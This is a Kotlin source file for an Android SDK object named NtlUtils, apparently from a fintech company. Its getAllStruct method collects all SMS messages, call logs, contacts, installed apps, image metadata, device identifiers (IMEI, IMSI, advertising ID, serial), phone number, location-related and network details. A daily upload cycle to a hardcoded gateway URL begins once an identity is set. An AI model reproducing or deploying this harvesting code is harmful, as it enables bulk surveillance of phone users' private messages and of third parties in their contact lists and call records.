package com.fintek.ntl_utils

import android.Manifest
import android.annotation.TargetApi
import android.app.Application
import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi
import androidx.annotation.RequiresPermission
import com.fintek.ntl_utils.upload.TimeCycleUnit
import com.fintek.ntl_utils.upload.UploadUtils
import com.fintek.utils_androidx.FintekUtils
import com.fintek.utils_androidx.packageInfo.PackageUtils
import com.fintek.utils_androidx.battery.BatteryUtils
import com.fintek.utils_androidx.call.CallUtils
import com.fintek.utils_androidx.contact.ContactUtils
import com.fintek.utils_androidx.date.DateUtils
import com.fintek.utils_androidx.device.DeviceUtils
import com.fintek.utils_androidx.hardware.HardwareUtils
import com.fintek.utils_androidx.image.ImageUtils
import com.fintek.utils_androidx.language.LanguageUtils
import com.fintek.utils_androidx.location.LocationUtils
import com.fintek.utils_androidx.mac.MacUtils
import com.fintek.utils_androidx.model.*
import com.fintek.utils_androidx.network.NetworkUtils
import com.fintek.utils_androidx.phone.PhoneUtils
import com.fintek.utils_androidx.sms.SmsUtils
import com.fintek.utils_androidx.storage.SDCardUtils
import com.fintek.utils_androidx.storage.StorageUtils
import com.fintek.utils_androidx.thread.ThreadUtils

/**
 * Created by ChaoShen on 2021/4/6
 */
@TargetApi(Build.VERSION_CODES.R)
object NtlUtils {

    /* Utils global identify, used in upload with network */
    @Volatile private var identify: Any? = null

    /* Utils global network base url */
    private var baseUrl: String = "https://uatdimsum.devdimsum.com/gateway-api"

    /* Utils global upload path url */
    private var uploadApiPath: String = "/api/common/content-upload"

    /* Utils global context */
    private var context: Application? = null

    /**
     * Utils used context
     * @see init
     */
    internal val requiredContext: Context get() = checkNotNull(context) {
        "Please use NtlUtils.init(Application application) first"
    }

    /**
     * Utils used identify
     * @see setIdentify
     * @see setIdentifyAsync
     */
    internal val requiredIdentify: Any get() = checkNotNull(identify) {
        "Please use FintekUtils.setIdentify(AbstractIdentify abstractIdentify) first"
    }

    /**
     * Utils used baseUrl
     * @see setBaseUrl
     */
    internal val requiredBaseUrl: String get() {
        require(baseUrl.isNotEmpty()) {
            "Please use FintekUtils.setBaseUrl(String baseUrl) first"
        }
        return baseUrl
    }

    /**
     * Utils used baseUrl
     * @see setUploadApiPath
     */
    internal val requiredUploadApiPath: String get() {
        require(uploadApiPath.isNotEmpty()) {
            "Please use FintekUtils.setUploadApiPath(String urlPath) first"
        }
        return uploadApiPath
    }

    fun init(context: Application) = apply {
        this.context = context
        FintekUtils.init(context)
    }

    /**
     * set base url
     * @param baseUrl utils upload struct url
     */
    @JvmStatic
    fun setBaseUrl(baseUrl: String) = apply {
        this.baseUrl = baseUrl
    }

    /**
     * set upload path url
     * @param urlPath
     */
    @JvmStatic
    fun setUploadApiPath(urlPath: String) = apply {
        this.uploadApiPath = urlPath
    }

    @JvmStatic
    fun <T> setIdentify(abstractIdentify: AbstractIdentify<T>) = apply {
        abstractIdentify.accept(abstractIdentify.invoke())
    }

    @JvmStatic
    fun <T> setIdentifyAsync(abstractIdentify: AbstractIdentify<T>) = apply {
        ThreadUtils.executeByCached(object : FintekUtils.Task<T>(abstractIdentify) {
            override fun doInBackground(): T {
                return abstractIdentify.invoke()
            }
        })
    }

    @RequiresPermission(anyOf = [
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    @JvmStatic
    fun getAllStruct(): StructPool {
        return StructPool(
            imageList = getImageList(),
            smsList = SmsUtils.getAllSms(),
            callLogList = CallUtils.getCalls() ?: emptyList(),
            contactList = ContactUtils.getContacts() ?: emptyList(),
            appList = PackageUtils.getAllPackage(),
            deviceInfo = getDeviceInfo(),
            hardwareInfo = getHardwareInfo(),
            phoneInfo = getPhoneInfo(),
            batteryInfo = getBatteryInfo(),
            networkInfo = getNetworkInfo(),
            storageInfo = getStorageInfo(),
        )
    }

    @RequiresPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
    private fun getImageList(): List<ImageInfo?> {
        val imagePathList = ImageUtils.getImageList()
        return imagePathList.map { ImageUtils.getImageParams(it) }
    }

    @RequiresPermission(anyOf = [Manifest.permission.READ_PHONE_STATE])
    private fun getDeviceInfo(): DeviceInfo {
        var gaid = ""
        DeviceUtils.getGaid(object : FintekUtils.Consumer<String> {
            override fun accept(t: String) {
                gaid = t
            }
        })

        Thread.sleep(2000)

        return DeviceInfo(
            imei = DeviceUtils.getImei(),
            gaid = gaid,
            androidId = DeviceUtils.getAndroidId(),
            imsi = DeviceUtils.getImsi(),
            isRoot = DeviceUtils.isRoot(),
            isLocationServiceEnable = LocationUtils.isLocationServiceEnable()
        )
    }

    private fun getHardwareInfo(): HardwareInfo = HardwareInfo(
        model = HardwareUtils.getModel(),
        brand = HardwareUtils.getBrand(),
        deviceName = HardwareUtils.getDevice(),
        product = HardwareUtils.getProduct(),
        systemVersion = HardwareUtils.getSystemVersion(),
        release = HardwareUtils.getRelease(),
        sdkVersion = HardwareUtils.getSDKVersion(),
        physicalSize = HardwareUtils.getPhysicalSize(),
        serialNumber = HardwareUtils.getSerialNumber()
    )

    @RequiresPermission(anyOf = [Manifest.permission.READ_PHONE_STATE, Manifest.permission.ACCESS_FINE_LOCATION])
    private fun getPhoneInfo(): PhoneInfo = PhoneInfo(
        phoneType = PhoneUtils.getPhoneType(),
        phoneNumber = PhoneUtils.getPhoneNumber(),
        mcc = PhoneUtils.getMCC(),
        mnc = PhoneUtils.getMNC(),
        localeIso3Language = LanguageUtils.getIso3Language(),
        localeIso3Country = LanguageUtils.getIso3Country(),
        timeZoneID = PhoneUtils.getTimeZoneId(),
        cid = PhoneUtils.getCID(),
        datetime = DateUtils.getCurrentDateTime(),
    )

    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    private fun getBatteryInfo(): BatteryInfo = BatteryInfo(
        percent = BatteryUtils.getPercent(),
        isCharging = BatteryUtils.isCharging(),
        isUsbCharging = BatteryUtils.isUsbCharging(),
        isAcCharging = BatteryUtils.isAcCharging()
    )

    @RequiresPermission(anyOf = [
        Manifest.permission.ACCESS_WIFI_STATE, Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.INTERNET
    ])
    private fun getNetworkInfo(): NetworkInfo {
        return NetworkInfo(
            networkType = NetworkUtils.getNetworkType().flag,
            isNetwork = NetworkUtils.isNetworkEnable(),
            networkOperatorName = NetworkUtils.getNetworkOperatorName(),
            networkOperator = NetworkUtils.getNetworkOperator(),
            userAgent = NetworkUtils.getUserAgent(),
            ip = NetworkUtils.getIPAddress(true),
            name = NetworkUtils.getConnectingWifiName(),
            bssid = NetworkUtils.getBSSID(),
            ssid = NetworkUtils.getSSID(),
            mac = MacUtils.getMacAddress(),
            configuredBSSID = NetworkUtils.getConfiguredBSSID(),
            configuredSSID = NetworkUtils.getConfiguredSSID(),
            configuredMac = NetworkUtils.getConfiguredMacByWifi()
        )
    }

    private fun getStorageInfo(): StorageInfo = StorageInfo(
        mainStorage = StorageUtils.getMainStoragePath(),
        externalStorage = StorageUtils.getExternalStoragePath(),
        storageTotalSize = StorageUtils.getTotalSizeRepaired(),
        storageAvailableSize = StorageUtils.getAvailableSizeRepaired(),
        sdCardTotalSize = SDCardUtils.getTotalSize(),
        sdCardAvailableSize = SDCardUtils.getAvailableSize()
    )

    abstract class AbstractIdentify<T> : FintekUtils.Consumer<T> {

        abstract fun invoke(): T

        override fun accept(t: T) {
            identify = t
            UploadUtils.cycleUpload(TimeCycleUnit.Day)
        }
    }
}